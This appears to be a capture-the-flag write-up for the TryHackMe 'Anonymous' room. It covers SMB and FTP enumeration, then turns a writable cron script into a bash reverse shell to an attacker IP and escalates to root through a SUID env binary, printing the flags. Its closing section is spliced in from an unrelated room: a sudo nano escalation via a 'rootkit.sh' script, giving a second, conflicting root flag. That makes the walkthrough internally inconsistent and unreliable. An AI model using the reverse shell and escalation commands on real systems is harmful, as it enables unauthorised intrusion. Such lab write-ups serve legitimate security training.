# Room: Anonymous

## General Info
- **Room link:** [Anonymous](https://tryhackme.com/room/anonymous)


## Description

Try to get the two flags!  Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.

## Provided Files / Links
- [x] Target Machine IP (10.10.56.61)

## Enumeration / Recon

- Port Enumeration:
`nmap -sV 10.10.56.61 -p- -T5`

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```
There are 2 smb services on port 139 and 445.

I first use enum4linux to try to get usernames: `enum4linux -U -o 10.10.56.61`

```
 ========================================( Users on 10.10.56.61 )========================================

index: 0x1 RID: 0x3eb acb: 0x00000010 Account: namelessone      Name: namelessone       Desc: 
```

I found the username `namelessone`.

I then try to get the shares on the target SMB machine, using an nmap script: `nmap -p 445 --script=smb-enum-shares.nse 10.10.56.61`.

```
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.56.61\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (anonymous server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.56.61\pics: 
|     Type: STYPE_DISKTREE
|     Comment: My SMB Share Directory for Pics
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\namelessone\pics
|     Anonymous access: READ
|     Current user access: READ
|   \\10.10.56.61\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

The share on the user's computer is called `\pics`.

I then continue my research about the smb protocols: `nmap -p 139,445 --script=smb-os-discovery,smb-protocols 10.10.56.61`.

```
Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2025-05-20T08:57:49+00:00
```

I went to see the content of the /pics share (`smbclient //10.10.56.61/pics -N`). There were 2 jpg files but nothing relevant in them (I checked the content with strings and exiftool).

I then tried to access the machine through ftp and I was able to log in as anonymous.

I found a clean.sh file that was actually running on a CRON. 

I modified the script to get a reverse shell:

```
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.9.1.194/1337 0>&1
```

I put a listener on port 1337: `nc -nlvp 1337`

And I was able to get the reverse shell.

### Target machine exploitation

I stabilize the shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

I get the flag in the user.txt file: **90d6f992585815ff991e68748c414740**

Then I downloaded and ran linpeas.sh in the /tmp directory.

I found this specific information in the "Files with Interesting Permissions" section:

`-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env`

I then went to https://gtfobins.github.io/gtfobins/env/ to see if I can exploit this permission. I tried exploiting this one `/usr/bin/env /bin/sh -p` and I actually got root access.

I found the root.txt file (in /root/root.txt): **4d930091c31a622a7ed10f27999af363**.







If I select the option `read`, I will be able to exploit nano to get privilege escalation as root.

Before executing the script, I make some changes in my shell to stabilize further:

- CTRL + Z to go back to my attacker machine
- `stty raw -echo;fg`
- I now have a stabilized shell where I all the key presses are well interpreted

I try to run the command `sudo /bin/bash /opt/rootkit.sh` and select the option `read` but it get the error: Error `opening terminal: unknown`. It means that the terminal type isn't properly set when nano is launched with sudo from that script.

I then export `export TERM=xterm` and run the script (`sudo /bin/bash /opt/rootkit.sh` and select the option `read`).

Following https://gtfobins.github.io/gtfobins/nano/, I just have to press CTRL + R and CTRL + X and I can perform any command as root: cat /root/root.txt => **THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}**. 